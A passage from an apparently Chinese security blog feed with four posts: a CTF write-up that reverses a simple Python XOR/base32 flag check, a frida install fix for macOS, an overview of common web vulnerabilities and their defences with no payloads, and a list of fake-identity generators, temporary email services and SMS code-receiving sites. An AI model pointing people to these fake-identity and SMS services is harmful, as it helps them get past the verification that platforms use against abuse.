        <content type="html"><![CDATA[<p><img src="http://img.ex1t.xyz/20200708115429.jpeg"></p><blockquote><p>之前做ctf过程中遇到了一个使用python写写的加密程序.</p></blockquote><h2 id="加密过程源码"><a href="#加密过程源码" class="headerlink" title="加密过程源码"></a>加密过程源码</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">def</span> <span class="token function">encode1</span><span class="token punctuation">(</span>ans<span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> ans<span class="token punctuation">:</span>        x <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">36</span>        x <span class="token operator">=</span> x <span class="token operator">+</span> <span class="token number">25</span>        s <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>    <span class="token keyword">return</span> s<span class="token keyword">def</span> <span class="token function">encode2</span><span class="token punctuation">(</span>ans<span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> ans<span class="token punctuation">:</span>        x <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">36</span>        x <span class="token operator">=</span> x <span class="token operator">^</span> <span class="token number">36</span>        s <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>    <span class="token keyword">return</span> s<span class="token keyword">def</span> <span class="token function">encode3</span><span class="token punctuation">(</span>ans<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> base64<span class="token punctuation">.</span>b32encode<span class="token punctuation">(</span>ans<span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token string">' '</span><span class="token keyword">print</span> <span class="token string">'Please Input your flag:'</span>flag <span class="token operator">=</span> <span class="token builtin">raw_input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>final <span class="token operator">=</span> <span class="token string">'UC7KOWVXWVNKNIC2XCXKHKK2W5NLBKNOUOSK3LNNVWW3E==='</span><span class="token keyword">if</span> encode3<span class="token punctuation">(</span>encode2<span class="token punctuation">(</span>encode1<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> final<span class="token punctuation">:</span>    <span class="token keyword">print</span> <span class="token string">'correct'</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span> <span class="token string">'wrong'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="解密算法源码"><a href="#解密算法源码" class="headerlink" title="解密算法源码"></a>解密算法源码</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64final <span class="token operator">=</span> <span class="token string">'UC7KOWVXWVNKNIC2XCXKHKK2W5NLBKNOUOSK3LNNVWW3E==='</span><span class="token keyword">def</span> <span class="token function">decode3</span><span class="token punctuation">(</span>ans<span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> base64<span class="token punctuation">.</span>b32decode<span class="token punctuation">(</span>ans<span class="token punctuation">)</span>    <span class="token keyword">return</span> s<span class="token keyword">def</span> <span class="token function">decode2</span><span class="token punctuation">(</span>ans<span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> ans<span class="token punctuation">:</span>        x <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">36</span>        x <span class="token operator">=</span> x <span class="token operator">-</span> <span class="token number">36</span>        s <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>    <span class="token keyword">return</span> s<span class="token keyword">def</span> <span class="token function">decode1</span><span class="token punctuation">(</span>ans<span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> ans<span class="token punctuation">:</span>        x <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">25</span>        x <span class="token operator">=</span> x <span class="token operator">^</span> <span class="token number">36</span>        s <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>    <span class="token keyword">return</span> sth <span class="token operator">=</span> decode3<span class="token punctuation">(</span>final<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>th<span class="token punctuation">)</span>se <span class="token operator">=</span> decode2<span class="token punctuation">(</span>th<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>se<span class="token punctuation">)</span>fr <span class="token operator">=</span> decode1<span class="token punctuation">(</span>se<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>fr<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> Ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mac下安装frida报错解决方法</title>
      <link href="/2020/05/12/mac%E4%B8%8B%E5%AE%89%E8%A3%85frida%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
      <url>/2020/05/12/mac%E4%B8%8B%E5%AE%89%E8%A3%85frida%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="mac下安装frida报错解决方法"><a href="#mac下安装frida报错解决方法" class="headerlink" title="mac下安装frida报错解决方法"></a>mac下安装frida报错解决方法</h1><p>报错截图</p><p><img src="http://img.ex1t.xyz/20200512130536.png" alt="image-20200512130533292"></p><p>ssl的原因解决方法</p><p><code>sudo /Applications/Python\ 3.7/Install\ Certificates.command</code></p><p><img src="http://img.ex1t.xyz/20200512130756.png" alt="image-20200512130753246"></p><p>之后执行安装就可以了</p><p><img src="http://img.ex1t.xyz/20200512130825.png" alt="image-20200512130823453"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>常见漏洞描述</title>
      <link href="/2020/05/09/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%AE%80%E8%BF%B0/"/>
      <url>/2020/05/09/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%AE%80%E8%BF%B0/</url>
      
        <content type="html"><![CDATA[<p><img src="http://img.ex1t.xyz/20201230173056.jpg"></p><p>漏洞主要分为XSS注入、SQL注入、服务漏洞、文件上传、命令执行、文件包含、csrf、ssrf、反序列化等</p><h5 id="（1）XSS注入"><a href="#（1）XSS注入" class="headerlink" title="（1）XSS注入"></a>（1）XSS注入</h5><p><code>XSS攻击是通过注入恶意代码到用户浏览器的网页上，从而达到劫持用户回话的目的</code></p><h5 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h5><pre><code>网络钓鱼，包括盗取各类的用户账号窃取用户cookie窃取用户浏览请回话强制弹出广告页面、刷流量网络挂马提升用户权限，进一步渗透网站传播跨站脚本等</code></pre><h5 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h5><pre><code>（1）存储型：存储型保存到服务器上，只要访问这个页面就会触发，然后可以盗取信息。（2）反射型：也称作非持久型、参数型跨站脚本，非持久化,需要欺骗用户自己去点击链接才能触发XSS代码。（3）DOM型：这种类型则是利用非法输入来闭合对应的html标签。</code></pre><h5 id="出现原因"><a href="#出现原因" class="headerlink" title="出现原因"></a>出现原因</h5><pre><code>如在个人信息或发表文章等地方,加入代码,如果没有过滤或过滤不严,那么这些代码将储存到服务器中,用户访问该页面的时候触发代码执行</code></pre><h5 id="防范措施"><a href="#防范措施" class="headerlink" title="防范措施"></a>防范措施</h5><pre><code>1、过滤恶意代码2、待补充</code></pre><h5 id="实战-XSS挑战"><a href="#实战-XSS挑战" class="headerlink" title="实战-XSS挑战"></a>实战-XSS挑战</h5><pre><code>   [http://test.ctf8.com/](http://test.ctf8.com/   "http://test.ctf8.com/")</code></pre><h5 id="2-SQL注入"><a href="#2-SQL注入" class="headerlink" title="(2) SQL注入"></a>(2) SQL注入</h5><p><code>SQL注入是再web应用程序中事先定义好的查询语句添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询。</code></p><h5 id="危害-1"><a href="#危害-1" class="headerlink" title="危害"></a>危害</h5><pre><code>数据库信息泄漏数据库被恶意操作</code></pre><h5 id="分类-1"><a href="#分类-1" class="headerlink" title="分类"></a>分类</h5><p>根据后台数据库类型分类-不同的数据库注入语句有所不同</p><pre><code>Mysql：免费的，适用于中小型网站 。SQL Server：微软的一个关系型数据库，适用于中大型网站 。Oracle：支持多用户，大事务量的处理，适用于中大型网站 。Access：微软开发的一个小型数据库，适用于小网站。待补充</code></pre><p>根据注入方式分类</p><pre><code>整数型注入字符型注入报错注入布尔注入时间盲注待补充</code></pre><p>分类方式待补充</p><h5 id="出现原因-1"><a href="#出现原因-1" class="headerlink" title="出现原因"></a>出现原因</h5><pre><code>程序开发过程中不注意书写规范，对sql语句和关键字未进行过滤，导致客户端可以通过全局变量get或者post提交sql语句到服务器端正常运行;个人理解：对用户查询的语句未进行限制，导致用户采用拼接的方式来进行对数据库的恶意操作。</code></pre><h5 id="防范措施-1"><a href="#防范措施-1" class="headerlink" title="防范措施"></a>防范措施</h5><pre><code>拒绝已知的不良输入，即建立黑名单库接受已知的正常输入，即建立白名单库净化数据，对可能存在的恶意字符进行编码或转义后台使用正确的代码语法检查</code></pre><h5 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h5><pre><code>ctfhub.com   技能树/web/sql注入</code></pre><h5 id="3-服务漏洞"><a href="#3-服务漏洞" class="headerlink" title="(3) 服务漏洞"></a>(3) 服务漏洞</h5><p><code>待补充</code></p><h5 id="4-文件上传漏洞"><a href="#4-文件上传漏洞" class="headerlink" title="(4) 文件上传漏洞"></a>(4) 文件上传漏洞</h5><p><code>由于开发则在对用户文件上传功能实现代码上没有严格限制用户上传的文件后缀以及文件类型或者处理缺陷,而导致用户可以越过其本身权限向服务器上上传可执行的动态脚本文件:</code></p><h5 id="危害-2"><a href="#危害-2" class="headerlink" title="危害"></a>危害</h5><pre><code>导致网站甚至整个服务器被控制</code></pre><h5 id="分类-2"><a href="#分类-2" class="headerlink" title="分类"></a>分类</h5><pre><code>任意文件上传后缀大小写绕过文件类型绕过双写后缀名绕过请求特殊后缀绕过图片木马合并上传文件00截断绕过待补充</code></pre><h5 id="出现原因-2"><a href="#出现原因-2" class="headerlink" title="出现原因"></a>出现原因</h5><pre><code>对上传的文件未进行严格的检测。</code></pre><h5 id="防范措施-2"><a href="#防范措施-2" class="headerlink" title="防范措施"></a>防范措施</h5><pre><code>1. 检查文件上传路径 2. 文件扩展名检测3. 文件 MIME验证4. 文件内容检测 5. 图片二次渲染 6. 文件重命名待补充</code></pre><h5 id="实战-1"><a href="#实战-1" class="headerlink" title="实战"></a>实战</h5><pre><code>ctfhub.com   技能树/web/文件上传</code></pre><h5 id="5-命令执行漏洞"><a href="#5-命令执行漏洞" class="headerlink" title="(5) 命令执行漏洞"></a>(5) 命令执行漏洞</h5><p><code>应用在调用函数执行系统命令的时候，如果将用户的输入作为系统命令的参数拼接到命令行中，在没有过滤用户的输入的情况下，就会造成命令执行漏洞。</code></p><h5 id="危害-3"><a href="#危害-3" class="headerlink" title="危害"></a>危害</h5><pre><code>导致网站甚至整个服务器被控制</code></pre><h5 id="出现原因-3"><a href="#出现原因-3" class="headerlink" title="出现原因"></a>出现原因</h5><pre><code>对于用户的输入未进行严格的检测</code></pre><h5 id="防范措施-3"><a href="#防范措施-3" class="headerlink" title="防范措施"></a>防范措施</h5><pre><code>1. 关闭此功能2. 对用户输入进行过滤3. 限制输入格式待补充</code></pre><h5 id="实战-2"><a href="#实战-2" class="headerlink" title="实战"></a>实战</h5><pre><code>github.com  技能树/RCE/命令注入</code></pre><h5 id="6-文件包含漏洞"><a href="#6-文件包含漏洞" class="headerlink" title="(6) 文件包含漏洞"></a>(6) 文件包含漏洞</h5><p><code>服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码</code></p><h5 id="危害-4"><a href="#危害-4" class="headerlink" title="危害"></a>危害</h5><pre><code>导致网站甚至整个服务器被控制</code></pre><h5 id="分类-3"><a href="#分类-3" class="headerlink" title="分类"></a>分类</h5><p>本地文件包含,当被包含的文件在服务器本地时，就形成本地文件包含<br>远程文件包含RFI,当被包含的文件在第三方服务器时，叫做远程文件包含。</p><h5 id="出现原因-4"><a href="#出现原因-4" class="headerlink" title="出现原因"></a>出现原因</h5><pre><code>文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。</code></pre><h5 id="防范措施-4"><a href="#防范措施-4" class="headerlink" title="防范措施"></a>防范措施</h5><pre><code>1.PHP 中使用 open_basedir 配置限制访问在指定的区域2.过滤.（点）/（反斜杠）\（反斜杠）3.禁止服务器远程文件包含待补充</code></pre><h5 id="实战-3"><a href="#实战-3" class="headerlink" title="实战"></a>实战</h5><pre><code>ctfhub.com /技能树/RCE/文件包含</code></pre><h5 id="7-csrf"><a href="#7-csrf" class="headerlink" title="(7) csrf"></a>(7) csrf</h5><p><code>一种劫持受信任用户向服务器发送非预期请求的攻击方式。</code></p><h5 id="危害-5"><a href="#危害-5" class="headerlink" title="危害"></a>危害</h5><pre><code>盗用用户身份，进行操作，涉及个人隐私和个人财产安全</code></pre><h5 id="分类-4"><a href="#分类-4" class="headerlink" title="分类"></a>分类</h5><p>请求类型来区分。</p><pre><code>GET类型POST类型</code></pre><p>按照攻击类型分类，</p><pre><code>HTML CSRF攻击，JSOM HiJacking攻击FIash CSRF攻击待补充</code></pre><h5 id="出现原因-5"><a href="#出现原因-5" class="headerlink" title="出现原因"></a>出现原因</h5><pre><code>请求所有的参数均可确定请求的审核不严格，如：只验证了Cookie</code></pre><h5 id="防范措施-5"><a href="#防范措施-5" class="headerlink" title="防范措施"></a>防范措施</h5><pre><code>1.使用Token（随机的值）验证2.判断请求的Referer头是否为正常的发送请求的页面3.使用验证码待补充</code></pre><h5 id="实战-4"><a href="#实战-4" class="headerlink" title="实战"></a>实战</h5><pre><code>待补充</code></pre><h5 id="8-ssrf"><a href="#8-ssrf" class="headerlink" title="(8) ssrf"></a>(8) ssrf</h5><p><code>一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF是要目标网站的内部系统。（因为他是从内部系统访问的，所有可以通过它攻击外网无法访问的内部系统，也就是把目标网站当中间人）</code></p><h5 id="危害-6"><a href="#危害-6" class="headerlink" title="危害"></a>危害</h5><pre><code>盗用用户身份，进行操作，涉及个人隐私和个人财产安全</code></pre><h5 id="分类-5"><a href="#分类-5" class="headerlink" title="分类"></a>分类</h5><pre><code>待补充</code></pre><h5 id="出现原因-6"><a href="#出现原因-6" class="headerlink" title="出现原因"></a>出现原因</h5><pre><code>服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制。具体待补充</code></pre><h5 id="防范措施-6"><a href="#防范措施-6" class="headerlink" title="防范措施"></a>防范措施</h5><pre><code>1.禁止跳转2.过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。3.禁用不需要的协议，仅仅允许http和https请求。可以防止类似于file://, gopher://, ftp:// 等引起的问题4.设置URL白名单或者限制内网IP（使用gethostbyname()判断是否为内网IP）5.限制请求的端口为http常用的端口，比如 80、443、8080、80906.统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。待补充</code></pre><h5 id="实战-5"><a href="#实战-5" class="headerlink" title="实战"></a>实战</h5><pre><code>待补充</code></pre><h5 id="9-反序列化"><a href="#9-反序列化" class="headerlink" title="(9) 反序列化"></a>(9) 反序列化</h5><p><code>序列化是将运行时变量和程序对象转换成可以存储或传输的形式的过程。反序列化是将序列化形式转换回内存变量和程序对象的相反过程。序列化形式可以是基于文本的格式，例如JSON或XML，或二进制格式。许多高级的语言（如C＃，Java和PHP）都内置了对数据序列化的支持。</code></p><h5 id="危害-7"><a href="#危害-7" class="headerlink" title="危害"></a>危害</h5><pre><code>黑客可以利用它进行拒绝服务攻击、访问控制攻击和远程命令执行攻击。</code></pre><h5 id="分类-6"><a href="#分类-6" class="headerlink" title="分类"></a>分类</h5><pre><code>Java反序列化Python反序列化PHP反序列化等</code></pre><h5 id="出现原因-7"><a href="#出现原因-7" class="headerlink" title="出现原因"></a>出现原因</h5><pre><code>序列化和反序列化本身并不存在问题。但当输入的反序列化的数据可被用户控制，那么攻击者即可通过构造恶意输入，让反序列化产生非预期的对象，在此过程中执行构造的任意代码。</code></pre><h5 id="防范措施-7"><a href="#防范措施-7" class="headerlink" title="防范措施"></a>防范措施</h5><pre><code>1.进行完整性验证待补充</code></pre><h5 id="实战-6"><a href="#实战-6" class="headerlink" title="实战"></a>实战</h5><pre><code>待补充</code></pre><p>漏洞待补充</p><p>如有错误，敬请指正。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>匿名邮箱、临时邮箱、短信平台</title>
      <link href="/2020/04/21/%E5%8C%BF%E5%90%8D%E9%82%AE%E7%AE%B1%E3%80%81%E5%85%8D%E8%B4%B9%E4%B8%B4%E6%97%B6%E9%82%AE%E7%AE%B1%E3%80%81%E5%85%8D%E8%B4%B9%E7%9F%AD%E4%BF%A1%E6%8E%A5%E7%A0%81%E5%B9%B3%E5%8F%B0/"/>
      <url>/2020/04/21/%E5%8C%BF%E5%90%8D%E9%82%AE%E7%AE%B1%E3%80%81%E5%85%8D%E8%B4%B9%E4%B8%B4%E6%97%B6%E9%82%AE%E7%AE%B1%E3%80%81%E5%85%8D%E8%B4%B9%E7%9F%AD%E4%BF%A1%E6%8E%A5%E7%A0%81%E5%B9%B3%E5%8F%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="匿名邮箱、临时邮箱、短信平台"><a href="#匿名邮箱、临时邮箱、短信平台" class="headerlink" title="匿名邮箱、临时邮箱、短信平台"></a>匿名邮箱、临时邮箱、短信平台</h1><p><img src="http://img.ex1t.xyz/20201230172943.jpg"></p><h2 id="匿名个人身份信息生成器"><a href="#匿名个人身份信息生成器" class="headerlink" title="匿名个人身份信息生成器"></a>匿名个人身份信息生成器</h2><p><a href="https://www.fakenamegenerator.com/">https://www.fakenamegenerator.com/</a></p><p>Generate a Random Name - Fake Name Generator</p><p>国外的一个随机匿名身份信息生成器，可以生成一套包括姓名、性别、年龄、国家、身份证号、银行卡号、电话号码、邮箱地址、身高、体重、血型、车辆信息等的匿名身份资料，比较实用。</p><p><a href="http://www.haoweichi.com/">http://www.haoweichi.com/</a></p><p>国外随机身份信息生成器，可以生成美国、加拿大、日本、澳大利亚等身份信息，中文</p><h2 id="可以完全匿名注册的电子邮箱"><a href="#可以完全匿名注册的电子邮箱" class="headerlink" title="可以完全匿名注册的电子邮箱"></a>可以完全匿名注册的电子邮箱</h2><table><thead><tr><th>邮箱服务</th><th>网址</th></tr></thead><tbody><tr><td>ProtonMail</td><td><a href="https://protonmail.com/">https://protonmail.com/</a></td></tr><tr><td>mail.com</td><td><a href="https://www.mail.com/">https://www.mail.com/</a></td></tr></tbody></table><h2 id="临时、一次性、匿名邮箱"><a href="#临时、一次性、匿名邮箱" class="headerlink" title="临时、一次性、匿名邮箱"></a>临时、一次性、匿名邮箱</h2><table><thead><tr><th>网址</th><th>简介</th></tr></thead><tbody><tr><td><a href="http://24mail.chacuo.net/">http://24mail.chacuo.net/</a></td><td>临时电子邮箱,十分钟邮箱(10分钟),临时邮,临时Email,快速注册Email,24小时邮箱</td></tr><tr><td><a href="http://www.yopmail.com/">http://www.yopmail.com/</a></td><td>YOPmail 临时、匿名的免费邮箱地址。</td></tr><tr><td><a href="https://10minutemail.net/">https://10minutemail.net/</a></td><td>10分钟邮箱: 安全免费的一次性临时电邮地址</td></tr><tr><td><a href="https://10minutemail.org/">https://10minutemail.org/</a></td><td>10分钟邮箱: 安全免费的一次性临时电邮地址</td></tr><tr><td><a href="https://linshiyou.com/">https://linshiyou.com/</a></td><td>临时邮箱,10分钟邮箱,24小时邮箱</td></tr><tr><td><a href="https://www.guerrillamail.com/">https://www.guerrillamail.com/</a></td><td>Guerrilla Mail - Disposable Temporary E-Mail Address  <br>提示：ProtonMail 人机验证可用 guerrillamail.org 后缀。</td></tr><tr><td><a href="https://www.moakt.com/">https://www.moakt.com/</a></td><td>Moakt Email  临时邮箱专业服务</td></tr><tr><td><a href="https://temp-mail.org/">https://temp-mail.org/</a></td><td>Temp Mail - Disposable Temporary Email 支持中文，有安卓和ios客户端</td></tr><tr><td><a href="http://www.fakemailgenerator.com/">http://www.fakemailgenerator.com/</a></td><td>Fake Mail Generator - Free temporary email addresses</td></tr><tr><td><a href="https://tempail.com/">https://tempail.com/</a></td><td>-</td></tr><tr><td><a href="https://mail-temp.com/">https://mail-temp.com/</a></td><td>-</td></tr><tr><td><a href="https://tempm.com/">https://tempm.com/</a></td><td>-</td></tr></tbody></table><h2 id="国内手机号、短信验证码平台"><a href="#国内手机号、短信验证码平台" class="headerlink" title="国内手机号、短信验证码平台"></a>国内手机号、短信验证码平台</h2><table><thead><tr><th>网址</th><th>简介</th></tr></thead><tbody><tr><td><a href="http://www.smszk.com/">http://www.smszk.com/</a></td><td>在线短信验证码接收，手机验证码短信接收平台，最好用的免费云短信网站！</td></tr><tr><td><a href="https://sms.cm/">https://sms.cm/</a></td><td>云短信 - 免费在线短信接收，国内免费临时手机号</td></tr><tr><td><a href="https://sms.cngrok.com/receiving-sms/">https://sms.cngrok.com/receiving-sms/</a></td><td>短信码上到-掠影网络，国内临时接码的</td></tr><tr><td><a href="https://www.becmd.com/">https://www.becmd.com/</a></td><td>免费接码 - 免费短信验证码接收平台</td></tr><tr><td><a href="https://www.pdflibr.com/">https://www.pdflibr.com/</a></td><td>云短信 - 在线短信接收 中国,美国,菲律宾</td></tr><tr><td><a href="https://yunduanxin.net/">https://yunduanxin.net/</a></td><td>免费接短信,在线接收短信验证码 - 云短信帮助您从世界任何地方接收手机短信</td></tr><tr><td><a href="http://www.z-sms.com/">http://www.z-sms.com/</a></td><td>在线云短信</td></tr><tr><td><a href="https://www.materialtools.com/">https://www.materialtools.com/</a></td><td>云短信-在线短信接收</td></tr><tr><td><a href="http://www.xnsms.com/">http://www.xnsms.com/</a></td><td>免费接码平台</td></tr><tr><td><a href="https://www.smsbo.com/">https://www.smsbo.com/</a></td><td>Receive SMS Online</td></tr></tbody></table><h2 id="国外手机号、短信验证码平台"><a href="#国外手机号、短信验证码平台" class="headerlink" title="国外手机号、短信验证码平台"></a>国外手机号、短信验证码平台</h2><table><thead><tr><th>网址</th><th>简介</th><th>接收地区</th></tr></thead><tbody><tr><td><a href="http://hs3x.com/">http://hs3x.com/</a></td><td>Receive SMS Online For Free - Free Virtual Numbers</td><td>美国,英国,奥地利,瑞典,比利时</td></tr><tr><td><a href="http://receivefreesms.com/">http://receivefreesms.com/</a></td><td>Receive FREE SMS online</td><td>美国,英国,挪威,瑞典,荷兰,澳大利亚,匈牙利,立陶宛,中国香港等</td></tr><tr><td><a href="http://receivefreesms.net/">http://receivefreesms.net/</a></td><td>Receive-SMS-Now</td><td>美国,加拿大,西班牙</td></tr><tr><td><a href="http://receiveonlinesms.biz/">http://receiveonlinesms.biz/</a></td><td>Receive Online SMS</td><td>美国,瑞典,挪威,西班牙,英国</td></tr><tr><td><a href="http://receiveonlinesms.com/">http://receiveonlinesms.com/</a></td><td>Receive SMS Online</td><td>国外免费临时手机号</td></tr><tr><td><a href="http://receive-sms-online.com/">http://receive-sms-online.com/</a></td><td>Receive SMS Online</td><td>俄国,英国,乌克兰</td></tr><tr><td><a href="http://receivesmsonline.in/">http://receivesmsonline.in/</a></td><td>Receive SMS Online</td><td>美国,加拿大,西班牙</td></tr><tr><td><a href="http://receivesmsverification.com/">http://receivesmsverification.com/</a></td><td>Receive SMS</td><td>比利时,英国,美国</td></tr><tr><td><a href="http://sms.sellaite.com/">http://sms.sellaite.com/</a></td><td>SELLAITE</td><td>爱沙尼亚</td></tr><tr><td><a href="http://www.freesmsverifications.com/">http://www.freesmsverifications.com/</a></td><td>Receive Free SMS</td><td>美国,英国,法国,波兰,比利时,加拿大</td></tr><tr><td><a href="http://www.receive-sms-now.com/">http://www.receive-sms-now.com/</a></td><td>Receive-SMS-Now</td><td>美国,加拿大,荷兰</td></tr><tr><td><a href="http://www.shejiinn.com/">http://www.shejiinn.com/</a></td><td>免费接码, 短信验证码,在线接收短信,接码平台</td><td>中国,缅甸,美国</td></tr><tr><td><a href="http://z-sms.com/">http://z-sms.com/</a></td><td>Z-SMS</td><td>中国,美国,缅甸,爱沙尼亚</td></tr><tr><td><a href="https://ch.freephonenum.com/">https://ch.freephonenum.com/</a></td><td>FreePhonenum  国外免费临时手机号（中文）</td><td>美国,加拿大(支持免费发短信)</td></tr><tr><td><a href="https://receive-a-sms.com/">https://receive-a-sms.com/</a></td><td>Receive a SMS Online</td><td>美国,澳大利亚,挪威,奥地利,巴西,中国香港,南非,波兰,英国,加拿大</td></tr><tr><td><a href="https://receive-sms.com/">https://receive-sms.com/</a></td><td>Receive-SMS</td><td>美国</td></tr><tr><td><a href="https://smsnumbersonline.com/">https://smsnumbersonline.com/</a></td><td>Free SMS Numbers Online</td><td>美国,英国,加拿大,波兰</td></tr><tr><td><a href="https://sms-online.co/receive-free-sms/">https://sms-online.co/receive-free-sms/</a></td><td>Receive SMS online for Free</td><td>美国,英国,加拿大,瑞典,法国,马来西亚,印度尼西亚</td></tr><tr><td><a href="https://sms-receive.net/">https://sms-receive.net/</a></td><td>SMS-Receive</td><td>俄罗斯,法国,罗马尼亚,西班牙,荷兰,英国</td></tr><tr><td><a href="https://smsreceivefree.com/">https://smsreceivefree.com/</a></td><td>SMSReceiveFree</td><td>美国,英国,加拿大</td></tr><tr><td><a href="https://www.freeonlinephone.org/">https://www.freeonlinephone.org/</a></td><td>Free Online Phone - 美国,加拿大,英国,瑞典</td><td></td></tr><tr><td><a href="https://www.pinger.com/text-free/">https://www.pinger.com/text-free/</a></td><td>Textfree</td><td>-</td></tr><tr><td><a href="https://www.receivesms.co/">https://www.receivesms.co/</a></td><td>Receive SMS Online</td><td>美国,奥地利,比利时,加拿大,瑞士,丹麦,西班牙,英国,意大利,波兰,葡萄牙,瑞典等</td></tr><tr><td><a href="https://www.receivesms.net/">https://www.receivesms.net/</a></td><td>Receive SMS Online - 国外免费临时手机号</td><td>-</td></tr><tr><td><a href="https://www.receive-sms-online.info/">https://www.receive-sms-online.info/</a></td><td>Receive SMS Online for FREE</td><td>英国,罗马尼亚,美国,西班牙,法国,德国,俄罗斯</td></tr><tr><td><a href="https://www.receivesmsonline.net/">https://www.receivesmsonline.net/</a></td><td>RECEIVE SMS ONLINE</td><td>美国,加拿大,英国</td></tr><tr><td><a href="https://www.textnow.com/">https://www.textnow.com/</a></td><td>TextNow</td><td>美国</td></tr><tr><td><a href="https://www.twilio.com/">https://www.twilio.com/</a></td><td>Twilio - 用于SMS，语音，视频和身份验证的通信API。支持API调用，看上去很不错。</td><td>-</td></tr><tr><td><a href="https://zh.mytrashmobile.com/">https://zh.mytrashmobile.com/</a></td><td>MyTrashmobile</td><td>美国,英国,加拿大</td></tr><tr><td><a href="https://www.zusms.com/">https://www.zusms.com/</a></td><td>在线免费短信接收平台</td><td>中国香港、美国、加拿大、中国</td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在windows10-wsl下以图形化运行kali-linux</title>
      <link href="/2020/03/10/%E5%9C%A8windows10-wsl%E4%B8%8B%E4%BB%A5%E5%9B%BE%E5%BD%A2%E5%8C%96%E8%BF%90%E8%A1%8Ckali-linux/"/>
      <url>/2020/03/10/%E5%9C%A8windows10-wsl%E4%B8%8B%E4%BB%A5%E5%9B%BE%E5%BD%A2%E5%8C%96%E8%BF%90%E8%A1%8Ckali-linux/</url>
      
